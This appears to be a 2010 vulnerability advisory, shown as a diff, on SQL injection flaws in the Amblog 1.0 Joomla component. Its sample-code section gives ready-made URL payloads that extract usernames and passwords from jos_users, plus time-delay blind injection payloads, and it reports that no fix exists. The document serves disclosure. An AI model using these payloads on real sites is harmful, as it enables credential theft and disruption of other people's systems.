@@ -1,0 +1,91 @@
+Amblog 1.0 Joomla Component Multiple SQL Injection Vulnerabilities
+
+ Name              Amblog
+ Vendor            http://robitbt.hu
+ Versions Affected 1.0
+
+ Author            Salvatore Fresta aka Drosophila
+ Website           http://www.salvatorefresta.net
+ Contact           salvatorefresta [at] gmail [dot] com
+ Date              2010-08-10
+
+X. INDEX
+
+ I.    ABOUT THE APPLICATION
+ II.   DESCRIPTION
+ III.  ANALYSIS
+ IV.   SAMPLE CODE
+ V.    FIX
+ 
+
+I. ABOUT THE APPLICATION
+________________________
+
+Amblog is a simple blog engine for Joomla CMS.
+
+
+II. DESCRIPTION
+_______________
+
+Some parameters are not properly  sanitised before being
+used in SQL queries.
+
+
+III. ANALYSIS
+_____________
+
+Summary:
+
+ A) Multiple SQL Injection
+ B) Multiple Blind SQL Injection
+ 
+
+A) Multiple SQL Injection
+_________________________
+
+Some  parameters,  such as articleid and catid, are  not
+properly sanitised before being used in SQL queries.This
+can  be exploited to manipulate SQL queries by injecting
+arbitrary SQL code.
+
+
+B) Multiple Blind SQL Injection
+_________________________
+
+The articleid parameter is not properly sanitised before
+being  used  in  SQL  queries.  This can be exploited to
+manipulate SQL queries by injecting arbitrary SQL code.
+
+
+IV. SAMPLE CODE
+_______________
+
+A) Multiple SQL Injection
+
+http://site/path/index.php?option=com_amblog&view=amblog&catid=-1 UNION SELECT @@version
+
+http://site/path/index.php?option=com_amblog&task=article&articleid=-1 UNION SELECT 1,CONCAT(username,0x3a,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31 FROM jos_users
+
+http://site/path/index.php?option=com_amblog&task=newform&catid=-1 UNION SELECT 1,CONCAT(username,0x3a,password) FROM jos_users
+
+http://site/path/index.php?option=com_amblog&task=editform&articleid=-1 UNION SELECT 1,CONCAT(username,0x3a,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31 FROM jos_users
+
+http://site/path/index.php?option=com_amblog&task=editcommentform&articleid=-1 UNION SELECT 1,CONCAT(username,0x3a,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31 FROM jos_users
+
+http://site/path/index.php?option=com_amblog&task=savenewcomment&articleid=-1 UNION SELECT 1,CONCAT(username,0x3a,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31 FROM jos_users
+
+http://site/path/index.php?option=com_amblog&task=saveeditcomment&articleid=-1 UNION SELECT 1,CONCAT(username,0x3a,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31 FROM jos_users
+
+
+B) Multiple Blind SQL Injection
+
+http://site/path/index.php?option=com_amblog&task=editsave&articleid=-1 OR (SELECT(IF(0x41=0x41,BENCHMARK(9999999999,NULL),NULL)))
+
+http://site/path/index.php?option=com_amblog&task=delete&articleid=-1 OR (SELECT(IF(0x41=0x41,BENCHMARK(9999999999,NULL),NULL)))
+
+
+V. FIX
+______
+
+No fix.
+
